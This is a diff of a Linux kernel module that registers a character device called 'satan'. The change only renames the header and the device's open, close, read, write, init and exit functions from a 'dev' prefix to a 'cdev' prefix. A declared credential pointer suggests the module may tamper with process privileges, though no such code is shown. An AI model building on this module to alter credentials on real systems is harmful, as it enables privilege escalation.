@@ -1,5 +1,5 @@
 // Copyright (c) 2020 Marco Wang <m.aesophor@gmail.com>
-#include "dev.h"
+#include "cdev.h"
 
 #include <linux/cdev.h>
 #include <linux/fs.h>
@@ -24,21 +24,21 @@ static dev_t dev_num;
 static struct file_operations fops;
 static struct cred *cred = NULL;
 
-static int satan_dev_open(struct inode *inode, struct file *filp);
-static int satan_dev_close(struct inode *inode, struct file *filp);
-static ssize_t satan_dev_read(struct file *filp, char __user *buf,
-                              size_t count, loff_t *offset);
-static ssize_t satan_dev_write(struct file *filp, const char __user *buf,
-                               size_t count, loff_t *cur_offset);
+static int satan_cdev_open(struct inode *inode, struct file *filp);
+static int satan_cdev_close(struct inode *inode, struct file *filp);
+static ssize_t satan_cdev_read(struct file *filp, char __user *buf,
+                               size_t count, loff_t *offset);
+static ssize_t satan_cdev_write(struct file *filp, const char __user *buf,
+                                size_t count, loff_t *cur_offset);
 
 
-int satan_dev_init(struct module *m)
+int satan_cdev_init(struct module *m)
 {
         fops.owner = m;
-        fops.open = satan_dev_open;
-        fops.release = satan_dev_close;
-        fops.write = satan_dev_write;
-        fops.read = satan_dev_read;
+        fops.open = satan_cdev_open;
+        fops.release = satan_cdev_close;
+        fops.write = satan_cdev_write;
+        fops.read = satan_cdev_read;
 
 
         memset(satan_dev.data, 0, sizeof(satan_dev.data));
@@ -77,7 +77,7 @@ init_end:
         return ret;
 }
 
-void satan_dev_exit(void)
+void satan_cdev_exit(void)
 {
         // Unregister our character device from the kernel
         cdev_del(satan_dev.cdev);
@@ -87,7 +87,7 @@ void satan_dev_exit(void)
 }
 
 
-static int satan_dev_open(struct inode *inode, struct file *filp)
+static int satan_cdev_open(struct inode *inode, struct file *filp)
 {
         if (0 != down_interruptible(&satan_dev.semaphore)) {
                 pr_alert("satan: failed to lock device file during open()\n");
@@ -98,14 +98,14 @@ static int satan_dev_open(struct inode *inode, struct file *filp)
         return 0;
 }
 
-static int satan_dev_close(struct inode *inode, struct file *filp)
+static int satan_cdev_close(struct inode *inode, struct file *filp)
 {
         up(&satan_dev.semaphore);
         pr_info("satan: successfully closed device file\n");
         return 0;
 }
 
-static ssize_t satan_dev_read(struct file *filp, char __user *buf, size_t len, loff_t *offset)
+static ssize_t satan_cdev_read(struct file *filp, char __user *buf, size_t len, loff_t *offset)
 {
         pr_info("satan: reading from device file\n");
 
@@ -123,7 +123,7 @@ static ssize_t satan_dev_read(struct file *filp, char __user *buf, size_t len, l
         return ret;
 }
 
-static ssize_t satan_dev_write(struct file *filp, const char __user *buf, size_t len, loff_t *offset)
+static ssize_t satan_cdev_write(struct file *filp, const char __user *buf, size_t len, loff_t *offset)
 {
         pr_info("satan: writing to device file\n");
 
